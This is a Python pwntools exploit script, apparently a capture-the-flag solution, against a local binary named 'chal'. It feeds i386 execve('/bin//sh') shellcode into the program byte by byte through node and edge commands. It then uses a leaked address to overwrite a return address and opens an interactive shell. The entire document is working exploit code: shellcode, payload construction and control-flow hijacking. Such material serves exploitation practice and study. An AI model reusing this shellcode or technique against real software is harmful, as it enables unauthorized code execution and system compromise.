from pwn import *
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
shell_pos = b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59"
context.update(arch='i386', os='linux')
context.terminal = ["tmux", "splitw", "-h"]

#conn = gdb.debug('./chal','''
#break challenge.c:211
#break challenge.c:214
#continue
#''')
conn = process("./chal")
print(conn.recvuntil(': '))
for i in range(0,len(shellcode)):
    if i < len(shellcode) - 1:
        edge_cmd = b'E' + bytes([shell_pos[i]]) + bytes([shell_pos[i + 1]]) + b'\x01'
        print(edge_cmd)
        conn.sendline(edge_cmd)
        print(conn.recvuntil(': '))
    val_cmd = b'V' + bytes([shell_pos[i]]) + bytes([shellcode[i]])
    print(val_cmd)
    conn.sendline(val_cmd)
    print(conn.recvuntil(': '))

conn.sendline(b'N')
#conn.interactive()
print(conn.recvuntil(': '))

conn.sendline(b'A\x59')
print(conn.recvuntil('<'))

addr = conn.recvuntil('>')
#conn.interactive()

addr = int(addr[:-1],16)
ra_addr = p32(addr + 310)
addr = p32(addr)
print(addr,ra_addr)
cmd = addr * 4 + b'\x59A' + ra_addr 
print(cmd)
#conn.interactive()
#conn.interactive()
conn.sendline(cmd)
conn.interactive()
